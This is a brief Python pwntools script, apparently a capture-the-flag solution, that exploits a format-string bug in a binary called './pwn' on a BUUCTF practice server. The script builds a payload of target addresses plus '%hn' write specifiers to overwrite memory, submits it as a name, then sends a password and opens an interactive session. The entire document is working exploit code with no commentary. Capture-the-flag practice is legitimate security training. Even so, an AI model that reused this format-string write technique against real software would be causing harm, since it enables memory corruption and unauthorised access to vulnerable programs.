from pwn import *

TMUX = 1
DEBUG = 0
LOG_PRINT = 1


if DEBUG:
    io = process('./pwn')
    context(log_level='debug')
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x8049040\nc\n')
else:
    io = remote('node3.buuoj.cn', 27129)
# log.success("pid: {}".format(proc.pidof(io)))
# 0x0029001f
payload = b'a' * 4 + p32(0x804c044) + p32(0x804c046) + b'%10$x' + b'%0x10c%11$hn' + b'%10c%12$hn'
io.sendlineafter('name:', payload)
io.sendlineafter('passwd:',b'2687007')
io.interactive()